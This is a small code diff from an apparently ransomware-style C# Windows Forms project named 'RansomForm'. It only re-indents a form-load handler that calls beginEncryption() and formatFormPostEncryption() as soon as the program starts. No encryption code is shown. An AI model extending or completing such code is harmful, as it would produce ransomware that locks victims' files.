@@ -30,11 +30,11 @@ namespace RansomForm
       InitializeComponent();
     }
 
-    private void Form1_Load(object sender, EventArgs e)
-    {
-	  beginEncryption();
-      formatFormPostEncryption();
-    }
+  private void Form1_Load(object sender, EventArgs e)
+  {
+    beginEncryption();
+    formatFormPostEncryption();
+  }
 
     private void beginEncryption()
     {
